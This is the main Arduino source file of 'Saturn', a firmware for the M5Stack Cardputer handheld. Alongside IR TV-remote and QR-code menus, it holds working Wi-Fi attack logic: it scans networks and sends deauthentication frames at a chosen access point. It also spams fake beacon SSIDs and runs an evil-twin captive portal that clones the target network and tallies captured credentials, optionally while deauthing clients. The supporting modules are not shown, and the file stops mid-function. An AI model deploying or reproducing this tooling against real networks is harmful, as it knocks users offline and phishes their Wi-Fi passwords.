// Saturn Firmware for the M5 Stack Cardputer
// By: Henrique Sebastião (contato@henriquesebastiao.com)
// https://github.com/henriquesebastiao/saturn

// This code contains a lot of logic borrowed from https://github.com/n0xa/m5stick-nemo

#include <M5Cardputer.h>
#include <IRremoteESP8266.h>
#include <IRsend.h>
#include <DNSServer.h>
#include <WebServer.h>

#include "src/settings.h"
#include "src/language.h"
#include "src/infrared.h"
#include "src/beacon.h"
#include "src/deauth.h"
#include "src/sd.h"
#include "src/portal.h"

IRsend irsend(IR_SEND_PIN);

struct Menu {
  char name[25];
  int command;
};

struct QrCode {
  char name[13];
  String url;
};

Menu mainMenu[] = {
  {TXT_IR, 4},
  {"Wi-Fi", 20},
  {"QR Codes", 2},
  {TXT_SETTINGS, 3},
};
int mainMenuSize = sizeof(mainMenu) / sizeof(Menu);

Menu irDevicesMenu[] = {
  {"TV", 5},
  {TXT_BACK, 0},
};
int irDevicesMenuSize = sizeof(irDevicesMenu) / sizeof(Menu);

Menu irTvMenu[] = {
  {"Power", 7},
  {TXT_MUTE, 10},
  {"Volume +", 8},
  {"Volume -", 9},
  {"Menu", 18},
  {TXT_CHANNEL_UP, 11},
  {TXT_CHANNEL_DOWN, 12},
  {TXT_UP, 13},
  {TXT_DOWN, 14},
  {TXT_LEFT, 15},
  {TXT_RIGHT, 16},
  {"Enter", 17},
  {TXT_BACK, 0},
};
int irTvMenuSize = sizeof(irTvMenu) / sizeof(Menu);

Menu wifiMenu[] = {
  {TXT_WIFI_SCAN, 4},
  {TXT_WIFI_BEACON_FUNNY, 1},
  {TXT_WIFI_BEACON_FUNNY_BR, 2},
  {TXT_BEACON_ATTACK_RND, 3},
  {TXT_BACK, 0},
};
int wifiMenuSize = sizeof(wifiMenu) / sizeof(Menu);

Menu wifiAttackMenu[] = {
  {TXT_WIFI_PORTAL, 0},
  {TXT_WIFI_DEAUTH, 1},
  {TXT_WIFI_COMBINED, 2},
  {TXT_BACK, 5},
};
int wifiAttackMenuSize = sizeof(wifiAttackMenu) / sizeof(Menu);

QrCode qrMenu[] = {
  {"Saturn", "https://youtu.be/dzNvk80XY9s"},
  {TXT_INTERSTELLAR, "https://youtu.be/JuSsvM8B4Jc"},
  {"Shodan.io", "https://www.shodan.io/"},
  {"Fake Update", "https://fakeupdate.net/"},
  {"Hacker Typer", "https://hackertyper.com/"},
  {TXT_REPOSITORY, "https://github.com/henriquesebastiao/saturn"},
  {TXT_BACK, ""},
};
int qrMenuSize = sizeof(qrMenu) / sizeof(QrCode);

Menu settingsMenu[] = {
  {TXT_BATTERY_INFO, 19},
  {TXT_BACK, 0},
};

// -=-=-= FUNCTIONS OF DRAWING MENUS =-=-=-

void drawMenu(Menu thisMenu[], int size) {
  DISPLAY.fillScreen(BG_COLOR);
  DISPLAY.setTextSize(MEDIUM_TEXT);
  DISPLAY.setTextColor(BG_COLOR);
  int y = HEIGHT_MENU_ITEMS;
  // Scrolling menu
  if (cursor < 0) {
    cursor = size - 1;  // rollover hack for up-arrow on cardputer
  }
  if (cursor > 3) {
    for (int i = 0 + (cursor - 3); i < size; i++) {
      if (cursor == i) {
        DISPLAY.fillRoundRect(5, y, DISPLAY.width() - 10, 30, 10, MAIN_COLOR); // Highlight the current menu item
        DISPLAY.setTextColor(BG_COLOR);
      } else {
        DISPLAY.fillRoundRect(5, y, DISPLAY.width() - 10, 30, 10, BG_COLOR);
        DISPLAY.setTextColor(MAIN_COLOR);
      }
      DISPLAY.drawRoundRect(5, y, DISPLAY.width() - 10, 30, 10, MAIN_COLOR); // Draw the border of the menu item
      DISPLAY.setCursor(20, y + 16);
      DISPLAY.print(thisMenu[i].name);
      y += SPACING_MENU_ITEMS; // Move to the next position for the next menu item
    }
  } else {
    for (int i = 0; i < size; i++) {
      if (cursor == i) {
        DISPLAY.fillRoundRect(5, y, DISPLAY.width() - 10, 30, 10, MAIN_COLOR); // Highlight the current menu item
        DISPLAY.setTextColor(BG_COLOR);
      } else {
        DISPLAY.fillRoundRect(5, y, DISPLAY.width() - 10, 30, 10, BG_COLOR);
        DISPLAY.setTextColor(MAIN_COLOR);
      }
      DISPLAY.drawRoundRect(5, y, DISPLAY.width() - 10, 30, 10, MAIN_COLOR); // Draw the border of the menu item
      DISPLAY.setCursor(20, y + 16);
      DISPLAY.print(thisMenu[i].name);
      y += SPACING_MENU_ITEMS; // Move to the next position for the next menu item
    }
  }
}

void qrDrawMenu(int size) {
  DISPLAY.fillScreen(BG_COLOR);
  DISPLAY.setTextSize(2);
  DISPLAY.setTextColor(BG_COLOR);
  int y = HEIGHT_MENU_ITEMS;
  // Scrolling menu
  if (cursor < 0) {
    cursor = size - 1;  // rollover hack for up-arrow on cardputer
  }
  if (cursor > 3) {
    for (int i = 0 + (cursor - 3); i < size; i++) {
      if (cursor == i) {
        DISPLAY.fillRoundRect(5, y, DISPLAY.width() - 10, 30, 10, MAIN_COLOR); // Highlight the current menu item
        DISPLAY.setTextColor(BG_COLOR);
      } else {
        DISPLAY.fillRoundRect(5, y, DISPLAY.width() - 10, 30, 10, BG_COLOR);
        DISPLAY.setTextColor(MAIN_COLOR);
      }
      DISPLAY.drawRoundRect(5, y, DISPLAY.width() - 10, 30, 10, MAIN_COLOR); // Draw the border of the menu item
      DISPLAY.setCursor(20, y + 16);
      DISPLAY.print(qrMenu[i].name);
      y += SPACING_MENU_ITEMS; // Move to the next position for the next menu item
    }
  } else {
    for (int i = 0; i < size; i++) {
      if (cursor == i) {
        DISPLAY.fillRoundRect(5, y, DISPLAY.width() - 10, 30, 10, MAIN_COLOR); // Highlight the current menu item
        DISPLAY.setTextColor(BG_COLOR);
      } else {
        DISPLAY.fillRoundRect(5, y, DISPLAY.width() - 10, 30, 10, BG_COLOR);
        DISPLAY.setTextColor(MAIN_COLOR);
      }
      DISPLAY.drawRoundRect(5, y, DISPLAY.width() - 10, 30, 10, MAIN_COLOR); // Draw the border of the menu item
      DISPLAY.setCursor(20, y + 16);
      DISPLAY.print(qrMenu[i].name);
      y += SPACING_MENU_ITEMS; // Move to the next position for the next menu item
    }
  }
}

void switcherButtonProc() {
  if (!rstOverride) {
    if (checkNextPress()) {
      isSwitching = true;
      currentProc = 1;
    }
  }
}

void checkMenuPress() {
  if (M5Cardputer.Keyboard.isKeyPressed('`')) {  // Return to the main menu by pressing ESC
    dimTimer();
    if (portalActive) {
      portalActive = false;
    }
    isSwitching = true;
    rstOverride = false;
    currentProc = 1;
  } else if (M5Cardputer.Keyboard.isKeyPressed(',')) {  // Return to the previous menu by pressing ,
    dimTimer();
    if (portalActive) {
      portalActive = false;
    }
    isSwitching = true;
    rstOverride = false;

    if (currentProc == 5) {
      currentProc = 4;
    } else {
      currentProc = 1;
    }
    delay(100);
  }
}

bool checkNextPress() {
  M5Cardputer.update();
  if (M5Cardputer.Keyboard.isKeyPressed(';')) {
    cursor = cursor - 2;
    dimTimer();
    return true;
  }
  if (M5Cardputer.Keyboard.isKeyPressed(KEY_TAB) || M5Cardputer.Keyboard.isKeyPressed('.')) {
    dimTimer();
    return true;
  }
  return false;
}

bool checkSelectPress() {
  M5Cardputer.update();
  if (M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER) || M5Cardputer.Keyboard.isKeyPressed('/')) {
    dimTimer();
    return true;
  }
  return false;
}

// -=-=-= MENU FUNCTIONS =-=-=-

void mainMenuSetup() {
  cursor = 0;
  rstOverride = true;
  drawMenu(mainMenu, mainMenuSize);
  delay(500);
}

void mainMenuLoop() {
  if (checkNextPress()) {
    cursor++;
    cursor = cursor % mainMenuSize;
    drawMenu(mainMenu, mainMenuSize);
    delay(250);
  }
  if (checkSelectPress()) {
    rstOverride = false;
    isSwitching = true;
    currentProc = mainMenu[cursor].command;
  }
}

void irDevicesMenuSetup() {
  cursor = 0;
  rstOverride = true;
  drawMenu(irDevicesMenu, irDevicesMenuSize);
  delay(500);
}

void irDevicesMenuLoop() {
  if (checkNextPress()) {
    cursor++;
    cursor = cursor % irDevicesMenuSize;
    drawMenu(irDevicesMenu, irDevicesMenuSize);
    delay(250);
  }
  if (checkSelectPress()) {
    if (irDevicesMenu[cursor].command == 0) {
      isSwitching = true;
      currentProc = 1;
    } else if (irDevicesMenu[cursor].command == 5) {
      isSwitching = true;
      currentProc = 5;
    }
  }
}

void irTvMenuSetup() {
  cursor = 0;
  rstOverride = true;

  #if defined(IR_SEND_PIN)
    irsend.begin();
  #endif
  // Hack: Set IRLED high to turn it off after setup. Otherwise it stays on (active low)
  digitalWrite(IR_SEND_PIN, HIGH);

  drawMenu(irTvMenu, irTvMenuSize);
  delay(500);
}

void irTvMenuLoop() {
  if (checkNextPress()) {
    cursor++;
    cursor = cursor % irTvMenuSize;
    drawMenu(irTvMenu, irTvMenuSize);
    delay(250);
  }
  if (checkSelectPress()) {
    if (irTvMenu[cursor].command == 0) {
      isSwitching = true;
      currentProc = 4;
    } else if (irTvMenu[cursor].command == 7) {  // Power
      // sendIrRawCodes(allIrPowerCodesRawTV, allIrPowerCodesRawTVLength, "POWER");
      sendIrProntoCodes(allIrPowerCodesProntoTV, allIrPowerCodesProntoTVLength, "POWER");
    } else if (irTvMenu[cursor].command == 10) {  // Mute
      // sendIrRawCodes(allIrMuteCodesRawTV, allIrMuteCodesRawTVLength, TXT_MUTE_TXT_UP);
      sendIrProntoCodes(allIrMuteCodesProntoTV, allIrMuteCodesProntoTVLength, TXT_MUTE_TXT_UPPER);
    } else if (irTvMenu[cursor].command == 8) {  // Volume +
      sendIrProntoCodes(allIrVolumeUpCodesProntoTV, allIrVolumeUpCodesProntoTVLength, "VOL +");
    } else if (irTvMenu[cursor].command == 9) {  // Volume -
      sendIrProntoCodes(allIrVolumeDownCodesProntoTV, allIrVolumeDownCodesProntoTVLength, "VOL -");
    } else if (irTvMenu[cursor].command == 11) {  // Channel +
      sendIrProntoCodes(allIrChannelUpCodesProntoTV, allIrChannelUpCodesProntoTVLength, TXT_CHANNEL_UP_UPPER);
    } else if (irTvMenu[cursor].command == 12) {  // Channel -
      sendIrProntoCodes(allIrChannelDownCodesProntoTV, allIrChannelDownCodesProntoTVLength, TXT_CHANNEL_DOWN_UPPER);
    } else if (irTvMenu[cursor].command == 13) {  // Up
      sendIrProntoCodes(allIrUpCodesProntoTV, allIrUpCodesProntoTVLength, TXT_UP_UPPER);
    } else if (irTvMenu[cursor].command == 14) {  // Down
      sendIrProntoCodes(allIrDownCodesProntoTV, allIrDownCodesProntoTVLength, TXT_DOWN_UPPER);
    } else if (irTvMenu[cursor].command == 15) {  // Left
      sendIrProntoCodes(allIrLeftCodesProntoTV, allIrLeftCodesProntoTVLength, TXT_LEFT_UPPER);
    } else if (irTvMenu[cursor].command == 16) {  // Right
      sendIrProntoCodes(allIrRightCodesProntoTV, allIrRightCodesProntoTVLength, TXT_RIGHT_UPPER);
    } else if (irTvMenu[cursor].command == 17) {  // Enter
      sendIrProntoCodes(allIrEnterCodesProntoTV, allIrEnterCodesProntoTVLength, "ENTER");
    } else if (irTvMenu[cursor].command == 18) {  // Menu
      sendIrProntoCodes(allIrMenuCodesProntoTV, allIrMenuCodesProntoTVLength, "MENU");
    }
  }
}

// -=-=-= Wi-Fi MENU =-=-=-

void wifiMenuSetup() {
  cursor = 0;
  rstOverride = true;
  drawMenu(wifiMenu, wifiMenuSize);
  delay(500);
}

void wifiMenuLoop() {
  if (checkNextPress()) {
    cursor++;
    cursor = cursor % wifiMenuSize;
    drawMenu(wifiMenu, wifiMenuSize);
    delay(250);
  }
  if (checkSelectPress()) {
    int option = wifiMenu[cursor].command;
    rstOverride = false;
    currentProc = 21;
    isSwitching = true;
    switch(option) {
      case 0:
        currentProc = 1;  // Back
        break;
      case 1:
        beaconType = 1;
        break;
      case 2:
        beaconType = 2;
        break;
      case 3:
        beaconType = 3;
        break;
      case 4:
        currentProc = 22;  // wi-Fi Scan
        break;
    }
  }
}

void wifiScanDrawMenu() {
  char ssid[19];
  DISPLAY.fillScreen(BG_COLOR);
  DISPLAY.setTextSize(MEDIUM_TEXT);
  DISPLAY.setTextColor(BG_COLOR);
  int y = HEIGHT_MENU_ITEMS;

  if (cursor > 3) {
    for (int i = 0 + (cursor - 3); i < wifict; i++) {
      if (cursor == i) {
        DISPLAY.fillRoundRect(5, y, DISPLAY.width() - 10, 30, 10, MAIN_COLOR); // Highlight the current menu item
        DISPLAY.setTextColor(BG_COLOR);
      } else {
        DISPLAY.fillRoundRect(5, y, DISPLAY.width() - 10, 30, 10, BG_COLOR);
        DISPLAY.setTextColor(MAIN_COLOR);
      }
      DISPLAY.drawRoundRect(5, y, DISPLAY.width() - 10, 30, 10, MAIN_COLOR); // Draw the border of the menu item
      DISPLAY.setCursor(20, y + 16);
      if(WiFi.SSID(i).length() > 18){
        WiFi.SSID(i).toCharArray(ssid, 19);
        DISPLAY.print(ssid);
      }else{
        DISPLAY.print(WiFi.SSID(i));
      }
      y += SPACING_MENU_ITEMS; // Move to the next position for the next menu item
    }

    // Rescan
    if (cursor == wifict) {
      DISPLAY.fillRoundRect(5, y, DISPLAY.width() - 10, 30, 10, MAIN_COLOR); // Highlight the current menu item
      DISPLAY.setTextColor(BG_COLOR);
    } else {
      DISPLAY.fillRoundRect(5, y, DISPLAY.width() - 10, 30, 10, BG_COLOR);
      DISPLAY.setTextColor(MAIN_COLOR);
    }
    DISPLAY.drawRoundRect(5, y, DISPLAY.width() - 10, 30, 10, MAIN_COLOR); // Draw the border of the menu item
    DISPLAY.setCursor(20, y + 16);
    DISPLAY.print(TXT_WIFI_RESCAN);
    y += SPACING_MENU_ITEMS; // Move to the next position for the next menu item

    // Back
    if (cursor == wifict + 1) {
      DISPLAY.fillRoundRect(5, y, DISPLAY.width() - 10, 30, 10, MAIN_COLOR); // Highlight the current menu item
      DISPLAY.setTextColor(BG_COLOR);
    } else {
      DISPLAY.fillRoundRect(5, y, DISPLAY.width() - 10, 30, 10, BG_COLOR);
      DISPLAY.setTextColor(MAIN_COLOR);
    }
    DISPLAY.drawRoundRect(5, y, DISPLAY.width() - 10, 30, 10, MAIN_COLOR); // Draw the border of the menu item
    DISPLAY.setCursor(20, y + 16);
    DISPLAY.print(TXT_BACK);
    y += SPACING_MENU_ITEMS; // Move to the next position for the next menu item
  } else {
    for (int i = 0; i < wifict; i++) {
      if (cursor == i) {
        DISPLAY.fillRoundRect(5, y, DISPLAY.width() - 10, 30, 10, MAIN_COLOR); // Highlight the current menu item
        DISPLAY.setTextColor(BG_COLOR);
      } else {
        DISPLAY.fillRoundRect(5, y, DISPLAY.width() - 10, 30, 10, BG_COLOR);
        DISPLAY.setTextColor(MAIN_COLOR);
      }
      DISPLAY.drawRoundRect(5, y, DISPLAY.width() - 10, 30, 10, MAIN_COLOR); // Draw the border of the menu item
      DISPLAY.setCursor(20, y + 16);
      if(WiFi.SSID(i).length() > 18){
        WiFi.SSID(i).toCharArray(ssid, 19);
        DISPLAY.print(ssid);
      }else{
        DISPLAY.print(WiFi.SSID(i));
      }
      y += SPACING_MENU_ITEMS; // Move to the next position for the next menu item
    }

    // Rescan
    if (cursor == wifict) {
      DISPLAY.fillRoundRect(5, y, DISPLAY.width() - 10, 30, 10, MAIN_COLOR); // Highlight the current menu item
      DISPLAY.setTextColor(BG_COLOR);
    } else {
      DISPLAY.fillRoundRect(5, y, DISPLAY.width() - 10, 30, 10, BG_COLOR);
      DISPLAY.setTextColor(MAIN_COLOR);
    }
    DISPLAY.drawRoundRect(5, y, DISPLAY.width() - 10, 30, 10, MAIN_COLOR); // Draw the border of the menu item
    DISPLAY.setCursor(20, y + 16);
    DISPLAY.print(TXT_WIFI_RESCAN);
    y += SPACING_MENU_ITEMS; // Move to the next position for the next menu item

    // Back
    if (cursor == wifict + 1) {
      DISPLAY.fillRoundRect(5, y, DISPLAY.width() - 10, 30, 10, MAIN_COLOR); // Highlight the current menu item
      DISPLAY.setTextColor(BG_COLOR);
    } else {
      DISPLAY.fillRoundRect(5, y, DISPLAY.width() - 10, 30, 10, BG_COLOR);
      DISPLAY.setTextColor(MAIN_COLOR);
    }
    DISPLAY.drawRoundRect(5, y, DISPLAY.width() - 10, 30, 10, MAIN_COLOR); // Draw the border of the menu item
    DISPLAY.setCursor(20, y + 16);
    DISPLAY.print(TXT_BACK);
    y += SPACING_MENU_ITEMS; // Move to the next position for the next menu item
  }
}

void wifiScanResultSetup() {
  cursor = 0;
  rstOverride = true;
  wifiScanDrawMenu();
  delay(500);
}

void wifiScanResultLoop(){
  if (checkNextPress()) {
    cursor++;
    cursor = cursor % ( wifict + 2);
    wifiScanDrawMenu();
    delay(250);
  }
  if (checkSelectPress()) {
    delay(250);
    if(cursor == wifict){
      rstOverride = false;
      currentProc = 22;
    }
    if(cursor == wifict + 1){
      rstOverride = false;
      isSwitching = true;
      currentProc = 20;
    }
    String encryptType = "";
    switch (WiFi.encryptionType(cursor)) {
    case 1:
      encryptType = "WEP";
      break;
    case 2:
      encryptType = "WPA/PSK/TKIP";
      break;
    case 3:
      encryptType = "WPA/PSK/CCMP";
      break;
    case 4:
      encryptType = "WPA2/PSK/Mixed/CCMP";
      break;
    case 8:
      encryptType = "WPA/WPA2/PSK";
      break ;
    case 0:
      encryptType = TXT_WIFI_OPEN;
      break ;
    }
    DISPLAY.fillScreen(BG_COLOR);
    DISPLAY.setCursor(0, 0);
    DISPLAY.setTextColor(BG_COLOR, MAIN_COLOR);
    if(WiFi.SSID(cursor).length() > 12){
      DISPLAY.setTextSize(SMALL_TEXT);
    }else if(WiFi.SSID(cursor).length() > 20){
      DISPLAY.setTextSize(MEDIUM_TEXT);
    }else{
      DISPLAY.setTextSize(MEDIUM_TEXT);
    }
    DISPLAY.fillRoundRect(5, 4, DISPLAY.width() - 10, 30, 10, MAIN_COLOR);
    DISPLAY.drawRoundRect(5, 4, DISPLAY.width() - 10, 30, 10, MAIN_COLOR);
    DISPLAY.setTextColor(BG_COLOR);
    DISPLAY.drawString(WiFi.SSID(cursor), DISPLAY_CENTER_X, 20);
    DISPLAY.setTextColor(MAIN_COLOR, BG_COLOR);
    DISPLAY.setTextSize(1.5);

    int y_info = 50;

    String frequency;

    int numberChannel = WiFi.channel(cursor);

    switch (numberChannel)
    {
    case 1:
      frequency = "2412 MHz";
      break;
    case 2:
      frequency = "2417 MHz";
      break;
    case 3:
      frequency = "2422 MHz";
      break;
    case 4:
      frequency = "2427 MHz";
      break;
    case 5:
      frequency = "2432 MHz";
      break;
    case 6:
      frequency = "2437 MHz";
      break;
    case 7:
      frequency = "2442 MHz";
      break;
    case 8:
      frequency = "2447 MHz";
      break;
    case 9:
      frequency = "2452 MHz";
      break;
    case 10:
      frequency = "2457 MHz";
      break;
    case 11:
      frequency = "2462 MHz";
      break;
    case 12:
      frequency = "2467 MHz";
      break;
    case 13:
      frequency = "2472 MHz";
      break;
    case 14:
      frequency = "2484 MHz";
      break;
    }

    String channel = TXT_WIFI_CHANNEL + String(numberChannel) + " - " + frequency;
    String crypt = TXT_WIFI_CRYPT + encryptType;
    String bssid = "MAC: " + WiFi.BSSIDstr(cursor);
    String signal = TXT_WIFI_SIGNAL + String(WiFi.RSSI(cursor)) + "dBm";

    String infos[4] = {channel, crypt, bssid, signal};

    for (int i = 0; i < 4; i++) {
      DISPLAY.drawString(infos[i], DISPLAY_CENTER_X, y_info);
      y_info += 15;
    }

    DISPLAY.setCursor(0, 100);
    DISPLAY.setTextColor(BLACK);

    DISPLAY.fillRoundRect(5, 110, DISPLAY.width() - 10, 20, 10, RED);
    DISPLAY.drawRoundRect(5, 110, DISPLAY.width() - 10, 20, 10, RED);
    DISPLAY.drawString(TXT_HOLD_ATTACK, DISPLAY_CENTER_X, 120);

    // DISPLAY.printf(" %-19s\n", TXT_HOLD_ATTACK);
    DISPLAY.setTextColor(MAIN_COLOR, BG_COLOR);
   if(checkSelectPress()){
      apMac=WiFi.BSSIDstr(cursor);
      apSsidName=WiFi.SSID(cursor);
      channel = static_cast<uint8_t>(WiFi.channel(cursor));
      uint8_t* bssid = WiFi.BSSID(cursor);
      memcpy(ap_record.bssid, bssid, 6);
      rstOverride = false;
      currentProc = 23;
      isSwitching = true;
      delay(100);
    }
  }
}

void wifiScanSetup() {
  rstOverride = false;  
  cursor = 0;
  DISPLAY.fillScreen(BG_COLOR);
  DISPLAY.setTextSize(LARGE_TEXT);
  DISPLAY.drawString(TXT_WIFI_SCAN_1, DISPLAY_CENTER_X, 50);
  DISPLAY.drawString(TXT_WIFI_SCAN_2, DISPLAY_CENTER_X, 90);
  delay(1000);
}

void wifiScanLoop(){
  DISPLAY.fillScreen(BG_COLOR);
  DISPLAY.setTextSize(MEDIUM_TEXT);
  DISPLAY.drawString(TXT_WIFI_SACANNING, DISPLAY_CENTER_X, 70);
  wifict = WiFi.scanNetworks();
  DISPLAY.fillScreen(BG_COLOR);
  DISPLAY.setTextSize(SMALL_TEXT);
  DISPLAY.setCursor(0, 0);
  if(wifict > 0){
    isSwitching = true;
    currentProc=24;
  }
}

void wifiAttackMenuSetup() {
  cursor = 0;
  rstOverride = true;
  drawMenu(wifiAttackMenu, wifiAttackMenuSize);
  delay(500);
}

void wifiAttackMenuLoop() {
  if (checkNextPress()) {
    cursor++;
    cursor = cursor % wifiAttackMenuSize;
    drawMenu(wifiAttackMenu, wifiAttackMenuSize);
    delay(250);
  }
  if (checkSelectPress()) {
    int option = wifiAttackMenu[cursor].command;
    rstOverride = false;
    currentProc = 23;
    isSwitching = true;
    switch(option) {
      case 0:
        rstOverride = false;
        isSwitching = true;
        clone_flg=true;
        target_deauth_flg=false;
        currentProc = 25;  // TODO -> PORTAL
        break;
      case 1:
        rstOverride = false;
        isSwitching = true;
        target_deauth_flg=false;
        target_deauth=true;
        currentProc = 26;
        break;
      case 2:
        rstOverride = false;
        isSwitching = true;
        clone_flg=true;
        target_deauth_flg=true;
        target_deauth=true;
        currentProc = 25;
        break;
      case 5:
        currentProc = 20;
        break;
    }
  }
}

void deauthSetup(){
  // Start the Access point service as Hidden
  WiFi.mode(WIFI_AP);
  WiFi.softAP(apSsidName, emptyString, channel, 1, 4, false);
  IPAddress apIP = WiFi.softAPIP();


  DISPLAY.fillScreen(BG_COLOR);
  DISPLAY.setCursor(0, 0);
  DISPLAY.setTextSize(LARGE_TEXT);
  DISPLAY.setTextColor(RED, BG_COLOR);
  DISPLAY.println("Deauth Atk");
  DISPLAY.setTextSize(SMALL_TEXT);
  DISPLAY.setTextColor(MAIN_COLOR, BG_COLOR);
  DISPLAY.print("\nSSID: " + apSsidName);
  DISPLAY.print("\n");
  DISPLAY.printf(TXT_WF_CHANN, channel);
  DISPLAY.print("> " + apMac);
  memcpy(deauth_frame, deauth_frame_default, sizeof(deauth_frame_default));
  wsl_bypasser_send_deauth_frame(&ap_record, channel);

  cursor = 0;
  rstOverride = false;
  delay(500); // Prevent switching after menu loads up
}

void deauthLoop(){
  if (target_deauth == true) {
    wsl_bypasser_send_raw_frame(deauth_frame, sizeof(deauth_frame_default));
    DISPLAY.setTextSize(SMALL_TEXT);
    DISPLAY.setTextColor(RED, BG_COLOR);
    DISPLAY.setCursor(1, 115);
    DISPLAY.println(TXT_DEAUTH_STOP);
    DISPLAY.setTextColor(MAIN_COLOR, BG_COLOR);
  } else{
    DISPLAY.setTextSize(SMALL_TEXT);
    DISPLAY.setTextColor(RED, BG_COLOR);
    DISPLAY.setCursor(1, 115);
    DISPLAY.println(TXT_DEAUTH_START);
    DISPLAY.setTextColor(MAIN_COLOR, BG_COLOR);
  }

  delay(100);

  if (checkSelectPress()){
    target_deauth = !target_deauth;
    DISPLAY.setCursor(1, 115);
    DISPLAY.println("......................");
    delay(500);
  }

  if (checkNextPress()){
    WiFi.mode(WIFI_MODE_STA);
    rstOverride = false;
    isSwitching = true;
    target_deauth = false;
    currentProc = 20;
    delay(500);
  }
}

// -=-=-= CAPITIVE PORTAL =-=-=-

void portalSetup(){
  setupWiFi();
  setupWebServer();
  portalActive = true;
  cursor = 0;
  rstOverride = true;
  printHomeToScreen();
  memcpy(deauth_frame, deauth_frame_default, sizeof(deauth_frame_default));
  wsl_bypasser_send_deauth_frame(&ap_record, channel);
  delay(500);
}

void portalLoop(){
  if ((millis() - lastTick) > PortalTickTimer) {
    lastTick = millis();
    if (totalCapturedCredentials != previousTotalCapturedCredentials) {
      previousTotalCapturedCredentials = totalCapturedCredentials;
      printHomeToScreen();
    }
  }
  if (clone_flg==true) {
    if (target_deauth_flg) {
      if (target_deauth == true) {
        if (deauth_tick==35) {
          wsl_bypasser_send_raw_frame(deauth_frame, sizeof(deauth_frame_default));
          deauth_tick=0;
        } else { 
          deauth_tick=deauth_tick+1; 
        }
        DISPLAY.setTextSize(SMALL_TEXT);
        DISPLAY.setTextColor(RED, BG_COLOR);
        DISPLAY.setCursor(1, 115);
        DISPLAY.println(TXT_DEAUTH_STOP);
        DISPLAY.setTextColor(MAIN_COLOR, BG_COLOR);
      } else{
        DISPLAY.setTextSize(SMALL_TEXT);
        DISPLAY.setTextColor(RED, BG_COLOR);
        DISPLAY.setCursor(1, 115);
        DISPLAY.println(TXT_DEAUTH_START);
        DISPLAY.setTextColor(MAIN_COLOR, BG_COLOR);
      }
      if (checkSelectPress()){
        target_deauth = !target_deauth;
        delay(500);
      }
    }
  }

  dnsServer.processNextRequest();
  webServer.handleClient();
  
  if (checkNextPress()){
    shutdownWebServer();
    portalActive = false;
    target_deauth_flg = false;
    target_deauth = false;
    clone_flg = false;
    currentProc = 20;
    delay(500);
  }
  checkSelectPress();
}

// -=-=-= BEACON =-=-=-

void wifiBeaconSetup() {
  // Create empty SSID
  for (int i = 0; i < 32; i++)
    emptySSID[i] = ' ';
  // For random generator
  randomSeed(1);

  // Set packetSize
  packetSize = sizeof(beaconPacket);
  if (wpa2) {
    beaconPacket[34] = 0x31;
  } else {
    beaconPacket[34] = 0x21;
    packetSize -= 26;
  }

  //change WiFi mode
  WiFi.mode(WIFI_MODE_STA);

  // set channel
  esp_wifi_set_channel(channels[0], WIFI_SECOND_CHAN_NONE);

  DISPLAY.fillScreen(BG_COLOR);
  DISPLAY.setTextSize(LARGE_TEXT);
  DISPLAY.drawString(TXT_BEACON_ATTACK_1, DISPLAY_CENTER_X, 50);
  DISPLAY.drawString(TXT_BEACON_ATTACK_2, DISPLAY_CENTER_X, 80);
  delay(1500);
  DISPLAY.setTextSize(SMALL_TEXT);
  DISPLAY.fillScreen(BG_COLOR);
  DISPLAY.setCursor(0, 0);
  DISPLAY.print(TXT_BEACON_ATTACK);

  int ct = 0;
  const char *str;
  switch(beaconType) {
  case 1:
    for(str = funnySSIDs; *str; ++str) ct += *str == '\n';
    DISPLAY.printf(" - %d SSIDs:\n", ct);
    DISPLAY.print(funnySSIDs);
    break;
  case 2:
    for(str = funnySSIDsBR; *str; ++str) ct += *str == '\n';
    DISPLAY.printf(" - %d SSIDs:\n", ct);
    DISPLAY.print(funnySSIDsBR);
    break;
  case 3:
    DISPLAY.printf(TXT_RND_SSID, ct);
    break;
  }
  DISPLAY.setTextSize(SMALL_TEXT);
  currentProc = 21;
}

void wifiBeaconLoop() {
  int i = 0;
  int len = 0;
  switch(beaconType) {
    case 1:
      len = sizeof(funnySSIDs);
      while(i < len){
        i++;
      }
      beaconSpamList(funnySSIDs);
      break;
    case 2:
      len = sizeof(funnySSIDsBR);
      while(i < len){
        i++;
      }
      beaconSpamList(funnySSIDsBR);
      break;
    case 3:
      char* randoms = randomSSID();
      len = sizeof(randoms);
      while(i < len){
        i++;
      }
      beaconSpamList(randoms);
      break;
  }
}

// -=-=-= QR CODES =-=-=-

void qrMenuSetup() {
  cursor = 0;
  rstOverride = true;
  qrDrawMenu(qrMenuSize);
  delay(500);
}

void qrMenuLoop() {
  if (checkNextPress()) {
    cursor++;
    cursor = cursor % (qrMenuSize);
    qrDrawMenu(qrMenuSize);
    delay(250);
  }
  if (checkSelectPress()) {
    if (qrMenu[cursor].url.length() < 1){
      currentProc = 1;
      isSwitching = true;
    }else if ( activeQR == false ) {
      activeQR = true;
      DISPLAY.fillScreen(WHITE);
      DISPLAY.qrcode(qrMenu[cursor].url, (DISPLAY.width() - DISPLAY.height()) / 2, 0, DISPLAY.height(), 5);
      delay(500);
    } else {
      isSwitching = true;
      activeQR = false;
      delay(250);
    }
  }
}

bool screen_dim_dimmed = false;
int screen_dim_current = 0;
int screen_dim_time = 30;

void screenBrightness(int bright){
  #if defined(BACKLIGHT)
    int bl = MINBRIGHT + round(((255 - MINBRIGHT) * bright / 100)); 
    analogWrite(BACKLIGHT, bl);
  #endif
}

int uptime(){
  return(int(millis() / 1000));
}

void dimTimer(){
  if(screen_dim_dimmed){
    screenBrightness(brightness);
    screen_dim_dimmed = false;
  }
  screen_dim_current = uptime() + screen_dim_time + 2;
}

// -=-=-= IR FUNCTIONS =-=-=-

void sendIrRawCodes(uint16_t *codes[], int sizes[], String name) {
  int size_all_codes = sizeof(codes) / sizeof(uint16_t*);

  Serial.println("\nSize of all codes: " + String(size_all_codes));
  bool endingEarly = false;

  for (int i = 0; i < size_all_codes; i++) {
    int size = sizes[i];
    DISPLAY.fillScreen(BG_COLOR);
    DISPLAY.setTextSize(LARGE_TEXT);
    DISPLAY.drawString(name, DISPLAY_CENTER_X, 50);
    DISPLAY.setTextSize(MEDIUM_TEXT);
    DISPLAY.drawString("<- p/ voltar", DISPLAY_CENTER_X, 80);

    irsend.sendRaw(codes[i], size, 38);

    Serial.println("\nSize of IR code: " + String(size));
    Serial.println("Sent IR codes:");
    for (int j = 0; j < size; j++) {
      Serial.print(codes[i][j]);
      Serial.print(", ");
    }
    delay(40);
  }
  digitalWrite(IR_SEND_PIN, HIGH);
  delay(1000);
  if (checkSelectPress()){
    Serial.println("STOPPING PREMATURELY");
    endingEarly = true;
